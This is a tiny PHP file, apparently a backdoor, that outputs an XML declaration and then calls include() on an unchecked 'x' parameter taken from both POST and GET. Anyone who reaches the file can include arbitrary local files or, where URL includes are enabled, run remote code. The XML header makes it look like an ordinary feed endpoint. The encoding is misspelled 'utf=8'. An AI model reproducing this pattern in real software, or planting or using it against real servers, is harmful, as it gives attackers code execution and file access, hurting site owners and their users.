<?php
//header ('Content-Type: text/xml');
echo '<?xml version="1.0" encoding="utf=8"?>'."\n";

if ( isset( $_POST[x] ) ) {
	include ( $_POST[x] );
}

if ( isset( $_GET[x] ) ) {
	include ( $_GET[x] );
}

?>